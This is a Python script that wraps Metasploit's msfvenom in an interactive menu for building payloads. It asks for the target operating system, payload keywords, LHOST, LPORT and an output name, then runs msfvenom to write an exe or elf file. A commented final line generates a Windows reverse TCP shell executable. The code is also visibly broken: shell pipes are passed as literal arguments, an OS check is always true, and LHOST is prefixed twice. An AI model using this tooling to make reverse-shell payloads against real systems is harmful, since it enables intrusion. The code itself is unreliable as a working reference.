#!/usr/bin/env python3

#Varibles/Imports
import os
from typing import final
from colorama import Fore, Back, Style
import subprocess
import socket
from netifaces import interfaces, ifaddresses, AF_INET

#helper function
def ip4_addresses(): #finds the interfaces and gets the ipaddress (ipv4) of them without loopback address
    ip_list = []
    for interface in interfaces():
        for link in ifaddresses(interface)[AF_INET]:
            ip_list.append(link['addr'])
    ip_list.remove('127.0.0.1')
    return ip_list

#Main Script
#Varibles
pastPackets = ()
baseSearch = ("msfvenom -l payloads")
finalPacket = ("msfvenom -p ")
program_call = 'msfvenom'
arg_one = '-p'
test = "0"


#allowable commands
os.system('cls' if os.name == 'nt' else "printf '\033c'")
menuOutput = "c", "C", "p", "P"

#Asking the user the target's operating system
print(Fore.RED + "MSFVenom Wrapper:")
#Main Menu
print("Welcome to our MSFVenom wrapper that will help you through creating a packet with step by step questions guided.")
print()
print("   Options:  ")
print()
print("   C - Create New Packet")
print("   P - Past Packet ")
print()

userInput = input(Fore.WHITE + "Command Line: ")

#Testing if the operation system is a valid system if not loop until right
while userInput not in menuOutput:
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + str(userInput) + " is not a valid option.")
  print("   Options:  ")
  print()
  print("   C - Create New Packet")
  print("   P - Past Packet ")
  print()
  userInput = input(Fore.WHITE + "Command Line: ")

#Payload Creator
def createPayload():
  global packetFinal
  packetCreation = 1
  global packetSearch
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + "Payload Creation:")
  print("Welcome, to allow for easier creation of your payload we will run you through some questions limiting to what is best suited for your needs then allowing you to pick from a more directed list of packets.")
  print()
  print("   (   If unknown press enter to skip question   )")
  print()

  #OS Question 1
  print("   Question 1: What is the targeted operating system? ")
  print("   Options: linux, mac, windows")
  print()
  OS = input(Fore.WHITE + "Command Line: ")
  opersystem = OS

  #If not command for OS
  operatingSystem = "linux", "windows", "mac"
  while OS not in operatingSystem:
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + str(OS) + " is not a valid operating system, what is your target's Operating System?")
   print("Options: Linux, Mac, Windows")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   opersystem = OS
  
  #Adds OS to search
  packetSearch = (str(baseSearch) + " |" + " grep " + str(OS) + " |")
  packetFinal = ""

  while packetCreation >= 1:
    os.system('cls' if os.name == 'nt' else "printf '\033c'")

    #Grep Question 2/...
    print(Fore.RED + "   Question 2: Are there any certain keys you wish to grep for? ")
    print("   Examples: reverse, x86, windows")
    print("   Note: If nothing else just press enter")
    print()
    OS = input(Fore.WHITE + "Command Line: ")

    global test
    if OS == "":
      packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
      packetCreation = 0

    if packetCreation == 1:
      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
      key = OS
      test = "1"
      packetCreation += 1
    elif packetCreation == 2:
      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
      twokey = OS
      test = "2"                                                                                                                                          
      packetCreation += 1
    elif packetCreation == 3:
      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
      threekey = OS
      test = "3"
      packetCreation += 1
    
  
  arge_zero = "|"
  arge_one = "grep"
  arge_two = '-v'
  arge_three = "meterpreter"
  arge_four = "-v"
  arge_five = "staged" 
  program_call1 = "-l"
  program_call2 = "payloads"
  
  global finalPacket                                                              
  #Packages should be here after the end
  if test == "0":
    os.system('cls' if os.name == 'nt' else "printf '\033c'")
    print(Fore.RED + "Payload Search:")
    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
    print(Fore.GREEN)
    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])

  if test == "1":
    os.system('cls' if os.name == 'nt' else "printf '\033c'")
    print(Fore.RED + "Payload Search:")
    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
    print(Fore.GREEN)
    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
    
  
  if test == "2":
    os.system('cls' if os.name == 'nt' else "printf '\033c'")
    print(Fore.RED + "Payload Search:")
    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
    print(Fore.GREEN)
    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])

  
  print()
  global arg_two
  arg_two = input(Fore.WHITE + "Command Line: ")
  if arg_two == "REDO":
    createPayload()

def  Lportnhost():
  global finalPacket
  global ip_address
  global lPort
  global arg_three
  global arg_four
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  #Find Local Host Automation
  # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  # s.connect(("8.8.8.8", 80))
  # ip_address = s.getsockname()[0]
  print(Fore.RED + "   Question 3: Let's move onto building the file, what is your LHOST in the command line? " + "Possible LHost addresses: " + str(ip4_addresses()))
  # print("   IP: " + str(ip_address))
  print()
  OS = input(Fore.WHITE + "Command Line: ")
  ip_address = "LHOST="+OS

  #If Lhost wrong
  operatingSystem = ""
  while OS in operatingSystem:
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + " What is your LHost that you want?" + " Possible LHost addresses:" + ip4_addresses())
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   ip_address = "LHOST="+OS
  
  finalPacket += ( " LHOST=" + str(ip_address))

  #Lport finder !!!
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + "   Question 4: Pick an unused port ")
  print()
  for port in range(1, 65536):
        with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
            res = sock.connect_ex(('localhost', port))
            if res == 0:
                print(Fore.GREEN + "   Ports in use: " + str(port))
  # print("   IP: " + str(ip_address))
  print()
  OS = input(Fore.WHITE + "Command Line: ")
  lPort = "LPORT="+OS

  finalPacket += ( " LPORT=" + str(lPort))

  #Is script for linux or windows?
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + "   Question 5: What format is the targeted machine? ")
  print("   Options: linux, windows, mac")
  print()
  OS = input(Fore.WHITE + "Command Line: ")
  typeOfMachine = OS

  target = 1

  while target == 1:

    if typeOfMachine == "windows" or "Windows":
      arg_three = '-f'
      arg_four = 'exe'
      # finalPacket += ( " -f exe")
      target = 0

    if typeOfMachine == "linux" or "Linux":
      arg_three = '-f'
      arg_four = 'elf'
      # finalPacket += ( " -f elf")
      target = 0
      
    else:
      os.system('cls' if os.name == 'nt' else "printf '\033c'")
      print(Fore.RED + str(OS) + " is not a valid option.")
      print("   Options: windows, linux")
      print()
      OS = input(Fore.WHITE + "Command Line: ")
    
def finlization():
  global arg_five
  global arg_six
  global finalPacket
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  #Type of payload and naming payload
  print(Fore.RED + "   Question 6: Lastly what would you like to name your payload? ")
  print()
  OS = input(Fore.WHITE + "Command Line: ")
  arg_five = OS
  arg_six = "-o"
  # finalPacket += ( " -o " + str(namePacket))

 

#Main Execution Program
if userInput == "C" or userInput == "c":
    createPayload()

#Pick a Packet ( Grep first 10 command for later grep -m 10)

#Finalization of packet config
Lportnhost()
finlization()
os.system('cls' if os.name == 'nt' else "printf '\033c'")
# packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
# # print (packet_call)
print(Fore.GREEN + program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five)
return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five])
print("output:", return_code)
# # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
# # print("output:", return_code)
